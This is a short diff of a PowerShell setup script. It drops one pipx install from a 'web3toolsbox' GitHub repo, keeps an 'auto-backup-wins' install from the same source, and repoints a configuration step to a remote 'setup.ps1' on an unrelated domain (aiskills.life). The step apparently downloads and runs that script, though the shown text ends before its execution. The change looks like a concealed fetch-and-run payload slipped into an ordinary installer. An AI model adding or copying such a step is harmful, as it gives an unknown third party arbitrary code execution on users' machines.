@@ -718,12 +718,11 @@ try {
     }
 
     $pipxInvoker = Install-Pipx -PythonPath $pythonPath
-    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe') -VenvNames @('claw')
     Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe') -VenvNames @('auto-backup-wins')
 
     if (Test-Path '.configs') {
         Write-StepLog 'Applying environment configuration'
-        $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
+        $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
 
         try {
             Enable-ModernTls
